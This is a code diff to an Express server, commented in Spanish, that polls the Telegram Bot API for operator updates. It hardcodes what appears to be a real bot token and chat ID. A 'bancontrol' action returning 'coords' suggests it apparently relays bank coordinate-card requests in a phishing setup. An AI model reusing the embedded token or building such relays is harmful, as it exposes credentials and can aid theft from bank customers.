@@ -8,8 +8,8 @@ app.use(express.json());
 const TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
 const CHAT_ID = process.env.CHAT_ID || "-1003027102929";
 
-// ── ESTADO PERSISTENTE (aquí sí funciona porque es un servidor real) ──
-let lastUpdateId = 0;
+// ── ESTADO PERSISTENTE ──
+let lastUpdateId = -1; // -1 = traer todos los updates disponibles
 let waitingForCoords = false;
 let pendingCoords = null;
 
@@ -43,8 +43,10 @@ app.get('/api/poll', async (req, res) => {
       return res.json({ ok: true, action: 'bancontrol', coords, update_id: lastUpdateId });
     }
 
+    // Si lastUpdateId es -1, traer últimos updates sin offset
+    const offsetParam = lastUpdateId >= 0 ? `&offset=${lastUpdateId + 1}` : '';
     const r = await fetch(
-      `https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=3&allowed_updates=["callback_query","message"]`
+      `https://api.telegram.org/bot${TOKEN}/getUpdates?timeout=3${offsetParam}&allowed_updates=["callback_query","message"]`
     );
     const data = await r.json();
 
